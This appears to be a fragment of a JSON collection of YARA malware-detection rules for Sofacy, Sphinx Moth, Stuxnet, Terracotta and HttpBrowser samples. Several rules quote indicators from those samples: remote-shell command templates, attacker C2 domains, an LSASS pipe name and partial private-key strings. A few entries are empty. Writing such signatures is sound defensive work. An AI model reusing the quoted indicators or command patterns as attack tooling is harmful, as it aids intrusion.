  "Sofacy_Bundestag_Winexe": "rule Sofacy_Bundestag_Winexe\n{\n\n    meta:\n        description = \"Winexe tool used by Sofacy group in Bundestag APT\"\n        author = \"Florian Roth\"\n        reference = \"http://dokumente.linksfraktion.de/inhalt/report-orig.pdf\"\n        date = \"2015-06-19\"\n        hash = \"5130f600cd9a9cdc82d4bad938b20cbd2f699aadb76e7f3f1a93602330d9997d\"\n        score = 70\n  \n    strings:\n        $s1 = \"\\\\\\\\.\\\\pipe\\\\ahexec\" fullword ascii \n        $s2 = \"implevel\" fullword ascii\n  \n    condition:\n        uint16(0) == 0x5a4d and filesize < 115KB and all of them\n}",
  "Sofacy_Bundestag_Mal2": "rule Sofacy_Bundestag_Mal2 \n{\n\n    meta:\n        description = \"Sofacy Group Malware Sample 2\"\n        author = \"Florian Roth\"\n        reference = \"http://dokumente.linksfraktion.de/inhalt/report-orig.pdf\"\n        date = \"2015-06-19\"\n        hash = \"566ab945f61be016bfd9e83cc1b64f783b9b8deb891e6d504d3442bc8281b092\"\n        score = 70\n   \n    strings:\n        $x1 = \"PROJECT\\\\XAPS_OBJECTIVE_DLL\\\\\" ascii\n        $x2 = \"XAPS_OBJECTIVE.dll\" fullword ascii\n        $s1 = \"i`m wait\" fullword ascii \n   \n    condition:\n        uint16(0) == 0x5a4d and ( 1 of ($x*) ) and $s1\n}",
  "Sofacy_Bundestag_Mal3": "rule Sofacy_Bundestag_Mal3 \n{\n\n    meta:\n        description = \"Sofacy Group Malware Sample 3\"\n        author = \"Florian Roth\"\n        reference = \"http://dokumente.linksfraktion.de/inhalt/report-orig.pdf\"\n        date = \"2015-06-19\"\n        hash = \"5f6b2a0d1d966fc4f1ed292b46240767f4acb06c13512b0061b434ae2a692fa1\"\n        score = 70\n   \n    strings:\n        $s1 = \"shell\\\\open\\\\command=\\\"System Volume Information\\\\USBGuard.exe\\\" install\" fullword ascii \n        $s2 = \".?AVAgentModuleRemoteKeyLogger@@\" fullword ascii \n        $s3 = \"<font size=4 color=red>process isn't exist</font>\" fullword ascii \n        $s4 = \"<font size=4 color=red>process is exist</font>\" fullword ascii \n        $s5 = \".winnt.check-fix.com\" fullword ascii \n        $s6 = \".update.adobeincorp.com\" fullword ascii \n        $s7 = \".microsoft.checkwinframe.com\" fullword ascii\n        $s8 = \"adobeincorp.com\" fullword wide \n        $s9 = \"# EXC: HttpSender - Cannot create Get Channel!\" fullword ascii \n        $x1 = \"User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:20.0) Gecko/20100101 Firefox/\" wide \n        $x2 = \"User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/2\" wide \n        $x3 = \"C:\\\\Windows\\\\System32\\\\cmd.exe\" fullword wide \n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and ( 2 of ($s*) or ( 1 of ($s*) and all of ($x*) )) \n}",
  "Sofacy_Bundestag_Batch": "rule Sofacy_Bundestag_Batch \n{\n\n    meta:\n        description = \"Sofacy Bundestags APT Batch Script\"\n        author = \"Florian Roth\"\n        reference = \"http://dokumente.linksfraktion.de/inhalt/report-orig.pdf\"\n        date = \"2015-06-19\"\n        score = 70\n \n    strings:\n        $s1 = \"for %%G in (.pdf, .xls, .xlsx, .doc, .docx) do (\" ascii \n        $s2 = \"cmd /c copy\"\n        $s3 = \"forfiles\"\n  \n    condition:\n        filesize < 10KB and all of them\n}",
  "Sofacy_Fybis_ELF_Backdoor_Gen1": "rule Sofacy_Fybis_ELF_Backdoor_Gen1\n{\n    \n    meta:\n        description = \"Detects Sofacy Fysbis Linux Backdoor_Naikon_APT_Sample1\"\n        author = \"Florian Roth\"\n        reference = \"http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/\"\n        date = \"2016-02-13\"\n        score = 80\n        hash1 = \"02c7cf55fd5c5809ce2dce56085ba43795f2480423a4256537bfdfda0df85592\"\n        hash2 = \"8bca0031f3b691421cb15f9c6e71ce193355d2d8cf2b190438b6962761d0c6bb\"\n    \n    strings:\n        $x1 = \"Your command not writed to pipe\" fullword ascii\n        $x2 = \"Terminal don`t started for executing command\" fullword ascii\n        $x3 = \"Command will have end with \\\\n\" fullword ascii\n        $s1 = \"WantedBy=multi-user.target' >> /usr/lib/systemd/system/\" fullword ascii\n        $s2 = \"Success execute command or long for waiting executing your command\" fullword ascii\n        $s3 = \"ls /etc | egrep -e\\\"fedora*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release\\\"\" fullword ascii\n        $s4 = \"rm -f /usr/lib/systemd/system/\" fullword ascii\n        $s5 = \"ExecStart=\" fullword ascii\n        $s6 = \"<table><caption><font size=4 color=red>TABLE EXECUTE FILES</font></caption>\" fullword ascii\n\n    condition:\n        ( uint16(0) == 0x457f and filesize < 500KB and 1 of ($x*) ) or ( 1 of ($x*) and 3 of ($s*) )\n}",
  "Sofacy_Fysbis_ELF_Backdoor_Gen2": "rule Sofacy_Fysbis_ELF_Backdoor_Gen2 \n{\n\n    meta:\n        description = \"Detects Sofacy Fysbis Linux Backdoor\"\n        author = \"Florian Roth\"\n        reference = \"http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/\"\n        date = \"2016-02-13\"\n        score = 80\n        hash1 = \"02c7cf55fd5c5809ce2dce56085ba43795f2480423a4256537bfdfda0df85592\"\n        hash2 = \"8bca0031f3b691421cb15f9c6e71ce193355d2d8cf2b190438b6962761d0c6bb\"\n        hash3 = \"fd8b2ea9a2e8a67e4cb3904b49c789d57ed9b1ce5bebfe54fe3d98214d6a0f61\"\n  \n    strings:\n        $s1 = \"RemoteShell\" ascii\n        $s2 = \"basic_string::_M_replace_dispatch\" fullword ascii\n        $s3 = \"HttpChannel\" ascii\n  \n    condition:\n        uint16(0) == 0x457f and filesize < 500KB and all of them\n}",
  "Sofacy_Jun16_Sample1": "rule Sofacy_Jun16_Sample1  \n{\n\n    meta:\n        description = \"Detects Sofacy Malware mentioned in PaloAltoNetworks APT report\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/mzAa97\"\n        date = \"2016-06-14\"\n        score = 85\n        hash1 = \"be1cfa10fcf2668ae01b98579b345ebe87dab77b6b1581c368d1aba9fd2f10a0\"\n\n    strings:\n        $s1 = \"clconfg.dll\" fullword ascii\n        $s2 = \"ASijnoKGszdpodPPiaoaghj8127391\" fullword wide\n\n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 200KB and ( 1 of ($s*) ) ) or ( all of them )\n}",
  "Sofacy_Jun16_Sample2": "rule Sofacy_Jun16_Sample2  \n{\n\n    meta:\n        description = \"Detects Sofacy Malware mentioned in PaloAltoNetworks APT report\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/mzAa97\"\n        date = \"2016-06-14\"\n        score = 85\n        hash1 = \"57d230ddaf92e2d0504e5bb12abf52062114fb8980c5ecc413116b1d6ffedf1b\"\n        hash2 = \"69940a20ab9abb31a03fcefe6de92a16ed474bbdff3288498851afc12a834261\"\n        hash3 = \"aeeab3272a2ed2157ebf67f74c00fafc787a2b9bbaa17a03be1e23d4cb273632\"\n \n    strings:\n        $x1 = \"DGMNOEP\" fullword ascii\n        $x2 = \"/%s%s%s/?%s=\" fullword ascii\n        $s1 = \"Control Panel\\\\Dehttps=https://%snetwork.proxy.ht2\" fullword ascii\n        $s2 = \"http=http://%s:%Control Panel\\\\Denetwork.proxy.ht&ol1mS9\" fullword ascii\n        $s3 = \"svchost.dll\" fullword wide\n        $s4 = \"clconfig.dll\" fullword wide\n    \n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 100KB and ( all of ($x*) ) ) or ( 3 of them )\n}",
  "Sofacy_Jun16_Sample3": "rule Sofacy_Jun16_Sample3 \n{\n\n    meta:\n        description = \"Detects Sofacy Malware mentioned in PaloAltoNetworks APT report\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/mzAa97\"\n        date = \"2016-06-14\"\n        score = 85\n        hash1 = \"c2551c4e6521ac72982cb952503a2e6f016356e02ee31dea36c713141d4f3785\"\n   \n    strings:\n        $s1 = \"ASLIiasiuqpssuqkl713h\" fullword wide\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and $s1\n}",
  "Sphinx_Moth_cudacrt": "rule Sphinx_Moth_cudacrt \n{ \n\n    meta:\n        description = \"sphinx moth threat group file cudacrt.dll\" \n        author = \"Kudelski Security - Nagravision SA\"\n        reference = \"www.kudelskisecurity.com\"\n        date = \"2015-08-06\"\n\n    strings:\n        $s0 = \"HPSSOEx.dll\" fullword wide\n        $s1 = \"255.255.255.254\" fullword wide\n        $s2 = \"SOFTWARE\\\\SsoAuth\\\\Service\" fullword wide\n        $op0 = { ff 15 5f de 00 00 48 8b f8 48 85 c0 75 0d 48 8b } /* Opcode */ \n        $op1 = { 45 33 c9 4c 8d 05 a7 07 00 00 33 d2 33 c9 ff 15 } /* Opcode */ \n        $op2 = { e8 7a 1c 00 00 83 f8 01 74 17 b9 03 } /* Opcode */\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 243KB and all of ($s*) and 1 of ($op*)\n}",
  "Sphinx_Moth_h2t": "rule Sphinx_Moth_h2t \n{ \n\n    meta:\n        description = \"sphinx moth threat group file h2t.dat\" \n        author = \"Kudelski Security - Nagravision SA (modified by Florian Roth)\" \n        reference = \"www.kudelskisecurity.com\"\n        date = \"2015-08-06\"\n\n    strings:\n        $x1 = \"%s <proxy ip> <proxy port> <target ip> <target port> <cmd> [arg1 cmd] ... [argX cmd]\" fullword ascii \n        $s1 = \"[-] Error in connection() %d - %s\" fullword ascii\n        $s2 = \"[-] Child process exit.\" fullword ascii\n        $s3 = \"POST http://%s:%s/ HTTP/1.1\" fullword ascii\n        $s4 = \"pipe() to\" fullword ascii\n        $s5 = \"pipe() from\" fullword ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 156KB and ($x1 or all of ($s*))\n}",
  "Sphinx_Moth_iastor32": "rule Sphinx_Moth_iastor32 \n{ \n\n    meta:\n        description = \"sphinx moth threat group file iastor32.exe\" \n        author = \"Kudelski Security - Nagravision SA\"\n        reference = \"www.kudelskisecurity.com\"\n        date = \"2015-08-06\"\n   \n    strings:\n        $s0 = \"MIIEpQIBAAKCAQEA4lSvv/W1Mkz38Q3z+EzJBZRANzKrlxeE6/UXWL67YtokF2nN\" fullword ascii /* private key */\n        $s1 = \"iAeS3CCA4wli6+9CIgX8SAiXd5OezHvI1jza61z/flsqcC1IP//gJVt16nRx3s9z\" fullword ascii /* private key */\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}",
  "Sphinx_Moth_kerberos32": "rule Sphinx_Moth_kerberos32 \n{\n\n    meta:\n        description = \"sphinx moth threat group file kerberos32.dll\" \n        author = \"Kudelski Security - Nagravision SA (modified by Florian Roth)\"\n        reference = \"www.kudelskisecurity.com\"\n        date = \"2015-08-06\"\n\n    strings:\n        $x1 = \"%WINDIR%\\\\ativpsrz.bin\" fullword ascii\n        $x2 = \"%WINDIR%\\\\ativpsrn.bin\" fullword ascii\n        $x3 = \"kerberos32.dll\" fullword wide\n        $x4 = \"KERBEROS64.dll\" fullword ascii\n        $x5 = \"kerberos%d.dll\" fullword ascii\n        $s1 = \"\\\\\\\\.\\\\pipe\\\\lsassp\" fullword ascii\n        $s2 = \"LSASS secure pipe\" fullword ascii /* PEStudio Blacklist: strings */ \n        $s3 = \"NullSessionPipes\" fullword ascii /* PEStudio Blacklist: strings */ \n        $s4 = \"getlog\" fullword ascii\n        $s5 = \"startlog\" fullword ascii /* PEStudio Blacklist: strings */\n        $s6 = \"stoplog\" fullword ascii /* PEStudio Blacklist: strings */\n        $s7 = \"Unsupported OS (%d)\" fullword ascii /* PEStudio Blacklist: strings */ \n        $s8 = \"Unsupported OS (%s)\" fullword ascii /* PEStudio Blacklist: strings */\n    \n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and (2 of ($x*) or all of ($s*))\n}",
  "Sphinx_Moth_kerberos64": "rule Sphinx_Moth_kerberos64 \n{ \n\n    meta:\n        description = \"sphinx moth threat group file kerberos64.dll\" \n        author = \"Kudelski Security - Nagravision SA (modified by Florian Roth)\"\n        reference = \"www.kudelskisecurity.com\"\n        date = \"2015-08-06\"\n\n    strings:\n        $s0 = \"KERBEROS64.dll\" fullword ascii\n        $s1 = \"zeSecurityDescriptor\" fullword ascii\n        $s2 = \"SpGetInfo\" fullword ascii\n        $s3 = \"SpShutdown\" fullword ascii\n        $op0 = { 75 05 e8 6a c7 ff ff 48 8b 1d 47 d6 00 00 33 ff } /* Opcode */ \n        $op1 = { 48 89 05 0c 2b 01 00 c7 05 e2 29 01 00 09 04 00 } /* Opcode */ \n        $op2 = { 48 8d 3d e3 ee 00 00 ba 58 } /* Opcode */\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 406KB and all of ($s*) and 1 of ($op*)\n}",
  "Sphinx_Moth_nvcplex": "rule Sphinx_Moth_nvcplex \n{ \n\n    meta:\n        description = \"sphinx moth threat group file nvcplex.dat\" \n        author = \"Kudelski Security - Nagravision SA\"\n        reference = \"www.kudelskisecurity.com\"\n        date = \"2015-08-06\"\n\n    strings:\n        $s0 = \"mshtaex.exe\" fullword wide\n        $op0 = { 41 8b cc 44 89 6c 24 28 48 89 7c 24 20 ff 15 d3 } /* Opcode */ \n        $op1 = { 48 3b 0d ad 8f 00 00 74 05 e8 ba f5 ff ff 48 8b } /* Opcode */ \n        $op2 = { 8b ce e8 49 47 00 00 90 8b 43 04 89 05 93 f1 00 } /* Opcode */\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 214KB and all of them\n}",
  "StuxNet_Malware_1": "rule StuxNet_Malware_1 \n{\n\n    meta:\n        description = \"Stuxnet Sample - file malware.exe\"\n        author = \"Florian Roth\"\n        reference = \"Internal Research\"\n        date = \"2016-07-09\"\n        hash1 = \"9c891edb5da763398969b6aaa86a5d46971bd28a455b20c2067cb512c9f9a0f8\"\n    \n    strings:\n         // 0x10001778 8b 45 08  mov     eax, dword ptr [ebp + 8]\n         // 0x1000177b 35 dd 79 19 ae    xor     eax, 0xae1979dd\n         // 0x10001780 33 c9     xor     ecx, ecx\n         // 0x10001782 8b 55 08  mov     edx, dword ptr [ebp + 8]\n         // 0x10001785 89 02     mov     dword ptr [edx], eax\n         // 0x10001787 89 ?? ??  mov     dword ptr [edx + 4], ecx\n         $op1 = { 8b 45 08 35 dd 79 19 ae 33 c9 8b 55 08 89 02 89 }\n         // 0x10002045 74 36     je      0x1000207d\n         // 0x10002047 8b 7f 08  mov     edi, dword ptr [edi + 8]\n         // 0x1000204a 83 ff 00  cmp     edi, 0\n         // 0x1000204d 74 2e     je      0x1000207d\n         // 0x1000204f 0f b7 1f  movzx   ebx, word ptr [edi]\n         // 0x10002052 8b 7f 04  mov     edi, dword ptr [edi + 4]\n         $op2 = { 74 36 8b 7f 08 83 ff 00 74 2e 0f b7 1f 8b 7f 04 }\n         // 0x100020cf 74 70     je      0x10002141\n         // 0x100020d1 81 78 05 8d 54 24 04      cmp     dword ptr [eax + 5], 0x424548d\n         // 0x100020d8 75 1b     jne     0x100020f5\n         // 0x100020da 81 78 08 04 cd ?? ??      cmp     dword ptr [eax + 8], 0xc22ecd04\n         $op3 = { 74 70 81 78 05 8d 54 24 04 75 1b 81 78 08 04 cd }\n  \n    condition:\n        all of them\n}",
  "Stuxnet_Malware_2": "rule Stuxnet_Malware_2 \n{\n   \n    meta:\n        description = \"Stuxnet Sample - file 63e6b8136058d7a06dfff4034b4ab17a261cdf398e63868a601f77ddd1b32802\"\n        author = \"Florian Roth\"\n        reference = \"Internal Research\"\n        date = \"2016-07-09\"\n        hash1 = \"63e6b8136058d7a06dfff4034b4ab17a261cdf398e63868a601f77ddd1b32802\"\n   \n    strings:\n        $s1 = \"\\\\SystemRoot\\\\System32\\\\hal.dll\" fullword wide\n        $s2 = \"http://www.jmicron.co.tw0\" fullword ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 70KB and all of them\n}",
  "StuxNet_dll": "rule StuxNet_dll \n{\n\n    meta:\n        description = \"Stuxnet Sample - file dll.dll\"\n        author = \"Florian Roth\"\n        reference = \"Internal Research\"\n        date = \"2016-07-09\"\n        hash1 = \"9e392277f62206098cf794ddebafd2817483cfd57ec03c2e05e7c3c81e72f562\"\n\n    strings:\n        $s1 = \"SUCKM3 FROM EXPLORER.EXE MOTH4FUCKA #@!\" fullword ascii\n    \n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and $s1\n}",
  "Stuxnet_Shortcut_to": "",
  "Stuxnet_Malware_3": "rule Stuxnet_Malware_3 \n{\n\n    meta:\n        description = \"Stuxnet Sample - file ~WTR4141.tmp\"\n        author = \"Florian Roth\"\n        reference = \"Internal Research\"\n        date = \"2016-07-09\"\n        hash1 = \"6bcf88251c876ef00b2f32cf97456a3e306c2a263d487b0a50216c6e3cc07c6a\"\n        hash2 = \"70f8789b03e38d07584f57581363afa848dd5c3a197f2483c6dfa4f3e7f78b9b\"\n\n    strings:\n        $x1 = \"SHELL32.DLL.ASLR.\" fullword wide\n        $s1 = \"~WTR4141.tmp\" fullword wide\n        $s2 = \"~WTR4132.tmp\" fullword wide\n        $s3 = \"totalcmd.exe\" fullword wide\n        $s4 = \"wincmd.exe\" fullword wide\n        $s5 = \"http://www.realtek.com0\" fullword ascii\n        $s6 = \"{%08x-%08x-%08x-%08x}\" fullword wide\n\n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 150KB and ( $x1 or 3 of ($s*) ) ) or ( 5 of them )\n}",
  "Stuxnet_Malware_4": "rule Stuxnet_Malware_4 \n{\n\n    meta:\n        description = \"Stuxnet Sample - file 0d8c2bcb575378f6a88d17b5f6ce70e794a264cdc8556c8e812f0b5f9c709198\"\n        author = \"Florian Roth\"\n        reference = \"Internal Research\"\n        date = \"2016-07-09\"\n        hash1 = \"0d8c2bcb575378f6a88d17b5f6ce70e794a264cdc8556c8e812f0b5f9c709198\"\n        hash2 = \"1635ec04f069ccc8331d01fdf31132a4bc8f6fd3830ac94739df95ee093c555c\"\n   \n    strings:\n        $x1 = \"\\\\objfre_w2k_x86\\\\i386\\\\guava.pdb\" ascii\n        $x2 = \"MRxCls.sys\" fullword wide\n        $x3 = \"MRXNET.Sys\" fullword wide\n   \n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 80KB and 1 of them ) or ( all of them )\n}",
  "Stuxnet_maindll_decrypted_unpacked": "rule Stuxnet_maindll_decrypted_unpacked \n{\n\n    meta:\n        description = \"Stuxnet Sample - file maindll.decrypted.unpacked.dll_\"\n        author = \"Florian Roth\"\n        reference = \"Internal Research\"\n        date = \"2016-07-09\"\n        hash1 = \"4c3d7b38339d7b8adf73eaf85f0eb9fab4420585c6ab6950ebd360428af11712\"\n\n    strings:\n        $s1 = \"%SystemRoot%\\\\system32\\\\Drivers\\\\mrxsmb.sys;%SystemRoot%\\\\system32\\\\Drivers\\\\*.sys\" fullword wide\n        $s2 = \"<Actions Context=\\\"%s\\\"><Exec><Command>%s</Command><Arguments>%s,#%u</Arguments></Exec></Actions>\" fullword wide\n        $s3 = \"%SystemRoot%\\\\inf\\\\oem7A.PNF\" fullword wide\n        $s4 = \"%SystemRoot%\\\\inf\\\\mdmcpq3.PNF\" fullword wide\n        $s5 = \"%SystemRoot%\\\\inf\\\\oem6C.PNF\" fullword wide\n        $s6 = \"@abf varbinary(4096) EXEC @hr = sp_OACreate 'ADODB.Stream', @aods OUT IF @hr <> 0 GOTO endq EXEC @hr = sp_OASetProperty @\" wide\n        $s7 = \"STORAGE#Volume#1&19f7e59c&0&\" fullword wide\n        $s8 = \"view MCPVREADVARPERCON as select VARIABLEID,VARIABLETYPEID,FORMATFITTING,SCALEID,VARIABLENAME,ADDRESSPARAMETER,PROTOKOLL,MAXLIMI\" ascii\n\n    condition:\n         6 of them\n}",
  "Stuxnet_s7hkimdb": "rule Stuxnet_s7hkimdb \n{\n\n    meta:\n        description = \"Stuxnet Sample - file s7hkimdb.dll\"\n        author = \"Florian Roth\"\n        reference = \"Internal Research\"\n        date = \"2016-07-09\"\n        hash1 = \"4071ec265a44d1f0d42ff92b2fa0b30aafa7f6bb2160ed1d0d5372d70ac654bd\"\n\n    strings:\n        $x1 = \"S7HKIMDX.DLL\" fullword wide\n\n        /* Opcodes by Binar.ly */\n\n        // 0x10001778 8b 45 08  mov     eax, dword ptr [ebp + 8]\n        // 0x1000177b 35 dd 79 19 ae    xor     eax, 0xae1979dd\n        // 0x10001780 33 c9     xor     ecx, ecx\n        // 0x10001782 8b 55 08  mov     edx, dword ptr [ebp + 8]\n        // 0x10001785 89 02     mov     dword ptr [edx], eax\n        // 0x10001787 89 ?? ??  mov     dword ptr [edx + 4], ecx\n        $op1 = { 8b 45 08 35 dd 79 19 ae 33 c9 8b 55 08 89 02 89 }\n        // 0x10002045 74 36     je      0x1000207d\n        // 0x10002047 8b 7f 08  mov     edi, dword ptr [edi + 8]\n        // 0x1000204a 83 ff 00  cmp     edi, 0\n        // 0x1000204d 74 2e     je      0x1000207d\n        // 0x1000204f 0f b7 1f  movzx   ebx, word ptr [edi]\n        // 0x10002052 8b 7f 04  mov     edi, dword ptr [edi + 4]\n        $op2 = { 74 36 8b 7f 08 83 ff 00 74 2e 0f b7 1f 8b 7f 04 }\n        // 0x100020cf 74 70     je      0x10002141\n        // 0x100020d1 81 78 05 8d 54 24 04      cmp     dword ptr [eax + 5], 0x424548d\n        // 0x100020d8 75 1b     jne     0x100020f5\n        // 0x100020da 81 78 08 04 cd ?? ??      cmp     dword ptr [eax + 8], 0xc22ecd04\n        $op3 = { 74 70 81 78 05 8d 54 24 04 75 1b 81 78 08 04 cd }\n\n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 40KB and $x1 and all of ($op*) )\n}",
  "Stuxnet_MadeInPython": "",
  "Apolmy_Privesc_Trojan": "rule Apolmy_Privesc_Trojan \n{\n\n    meta:\n        description = \"Apolmy Privilege Escalation Trojan used in APT Terracotta\"\n        author = \"Florian Roth\"\n        reference = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n        date = \"2015-08-04\"\n        score = 80\n        hash = \"d7bd289e6cee228eb46a1be1fcdc3a2bd5251bc1eafb59f8111756777d8f373d\"\n\n    strings:\n        $s1 = \"[%d] Failed, %08X\" fullword ascii\n        $s2 = \"[%d] Offset can not fetched.\" fullword ascii\n        $s3 = \"PowerShadow2011\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}",
  "Mithozhan_Trojan": "rule Mithozhan_Trojan \n{\n\n    meta:\n        description = \"Mitozhan Trojan used in APT Terracotta\"\n        author = \"Florian Roth\"\n        reference = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n        date = \"2015-08-04\"\n        score = 70\n        hash = \"8553b945e2d4b9f45c438797d6b5e73cfe2899af1f9fd87593af4fd7fb51794a\"\n    \n    strings:\n        $s1 = \"adbrowser\" fullword wide \n        $s2 = \"IJKLlGdmaWhram0vn36BgIOChYR3L45xcHNydXQvhmloa2ptbH8voYCDTw==\" fullword ascii\n        $s3 = \"EFGHlGdmaWhrL41sf36BgIOCL6R3dk8=\" fullword ascii\n    \n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}",
  "RemoteExec_Tool": "rule RemoteExec_Tool \n{\n\n    meta:\n        description = \"Remote Access Tool used in APT Terracotta\"\n        author = \"Florian Roth\"\n        reference = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n        date = \"2015-08-04\"\n        hash = \"a550131e106ff3c703666f15d55d9bc8c816d1cb9ac1b73c2e29f8aa01e53b78\"\n\n    strings:\n        $s0 = \"cmd.exe /q /c \\\"%s\\\"\" fullword ascii \n        $s1 = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" fullword ascii \n        $s2 = \"This is a service executable! Couldn't start directly.\" fullword ascii \n        $s3 = \"\\\\\\\\.\\\\pipe\\\\TermHlp_communicaton\" fullword ascii \n        $s4 = \"TermHlp_stdout\" fullword ascii \n        $s5 = \"TermHlp_stdin\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 75KB and 4 of ($s*)\n}",
  "LiuDoor_Malware_1": "rule LiuDoor_Malware_1 \n{\n\n    meta:\n        description = \"Liudoor Trojan used in Terracotta APT\"\n        author = \"Florian Roth\"\n        reference = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n        date = \"2015-08-04\"\n        score = 70\n        super_rule = 1\n        hash1 = \"deed6e2a31349253143d4069613905e1dfc3ad4589f6987388de13e33ac187fc\"\n        hash2 = \"4575e7fc8f156d1d499aab5064a4832953cd43795574b4c7b9165cdc92993ce5\"\n        hash3 = \"ad1a507709c75fe93708ce9ca1227c5fefa812997ed9104ff9adfec62a3ec2bb\"\n\n    strings:\n        $s1 = \"svchostdllserver.dll\" fullword ascii \n        $s2 = \"SvcHostDLL: RegisterServiceCtrlHandler %S failed\" fullword ascii \n        $s3 = \"\\\\nbtstat.exe\" fullword ascii\n        $s4 = \"DataVersionEx\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 150KB and all of them\n}",
  "LiuDoor_Malware_2": "",
  "liudoor": "rule liudoor\n{\n\n    meta:\n        author = \"RSA FirstWatch\"\n        date = \"2015-07-23\"\n        description = \"Detects Liudoor daemon backdoor\"\n        hash0 = \"78b56bc3edbee3a425c96738760ee406\"\n        hash1 = \"5aa0510f6f1b0e48f0303b9a4bfc641e\"\n        hash2 = \"531d30c8ee27d62e6fbe855299d0e7de\"\n        hash3 = \"2be2ac65fd97ccc97027184f0310f2f3\"\n        hash4 = \"6093505c7f7ec25b1934d3657649ef07\"\n        type = \"Win32 DLL\"\n\n    strings:\n        $string0 = \"Succ\"\n        $string1 = \"Fail\"\n        $string2 = \"pass\"\n        $string3 = \"exit\"\n        $string4 = \"svchostdllserver.dll\"\n        $string5 = \"L$,PQR\"\n        $string6 = \"0/0B0H0Q0W0k0\"\n        $string7 = \"QSUVWh\"\n        $string8 = \"Ht Hu[\"\n    condition:\n        all of them\n}",
  "HttpBrowser_RAT_dropper_Gen1": "rule HttpBrowser_RAT_dropper_Gen1 \n{\n\n    meta:\n        description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Dropper\"\n        author = \"Florian Roth\"\n        reference = \"http://snip.ly/giNB\"\n        date = \"2015-08-06\"\n        score = 70\n        hash1 = \"808de72f1eae29e3c1b2c32be1b84c5064865a235866edf5e790d2a7ba709907\"\n        hash2 = \"f6f966d605c5e79de462a65df437ddfca0ad4eb5faba94fc875aba51a4b894a7\"\n        hash3 = \"f424965a35477d822bbadb821125995616dc980d3d4f94a68c87d0cd9b291df9\"\n        hash4 = \"01441546fbd20487cb2525a0e34e635eff2abe5c3afc131c7182113220f02753\"\n        hash5 = \"8cd8159f6e4689f572e2087394452e80e62297af02ca55fe221fe5d7570ad47b\"\n        hash6 = \"10de38419c9a02b80ab7bf2f1f1f15f57dbb0fbc9df14b9171dc93879c5a0c53\"\n        hash7 = \"c2fa67e970d00279cec341f71577953d49e10fe497dae4f298c2e9abdd3a48cc\"\n  \n    strings:\n        $x1 = \"1001=cmd.exe\" fullword ascii \n        $x2 = \"1003=ShellExecuteA\" fullword ascii \n        $x3 = \"1002=/c del /q %s\" fullword ascii\n        $x4 = \"1004=SetThreadPriority\" fullword ascii\n\n        /* $s1 = \"pnipcn.dllUT\" fullword ascii\n        $s2 = \"ssonsvr.exeUT\" fullword ascii\n        $s3 = \"navlu.dllUT\" fullword ascii\n        $s4 = \"@CONOUT$\" fullword wide \n        $s5 = \"VPDN_LU.exeUT\" fullword ascii\n        $s6 = \"msi.dll.urlUT\" fullword ascii\n        $s7 = \"setup.exeUT\" fullword ascii \n        $s8 = \"pnipcn.dll.urlUT\" fullword ascii\n        $s9 = \"ldvpreg.exeUT\" fullword ascii */\n\n        $op0 = { e8 71 11 00 00 83 c4 10 ff 4d e4 8b f0 78 07 8b } /* Opcode */\n        $op1 = { e8 85 34 00 00 59 59 8b 86 b4 } /* Opcode */\n        $op2 = { 8b 45 0c 83 38 00 0f 84 97 } /* Opcode */\n        $op3 = { 8b 45 0c 83 38 00 0f 84 98 } /* Opcode */\n        $op4 = { 89 7e 0c ff 15 a0 50 40 00 59 8b d8 6a 20 59 8d } /* Opcode */\n        $op5 = { 56 8d 85 cd fc ff ff 53 50 88 9d cc fc ff ff e8 } /* Opcode */\n    \n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and all of ($x*) and 1 of ($op*)\n}",
  "HttpBrowser_RAT_Sample1": "rule HttpBrowser_RAT_Sample1 \n{\n\n    meta:\n        description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Sample update.hancominc.com\"\n        author = \"Florian Roth\"\n        reference = \"http://snip.ly/giNB\"\n        date = \"2015-08-06\"\n        score = 80\n        hash1 = \"be334d1f8fa65a723af65200a166c2bbdb06690c8b30fafe772600e4662fc68b\"\n        hash2 = \"1052ad7f4d49542e4da07fa8ea59c15c40bc09a4d726fad023daafdf05866ebb\"\n   \n    strings:\n        $s0 = \"update.hancominc.com\" fullword wide \n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and $s0\n}",
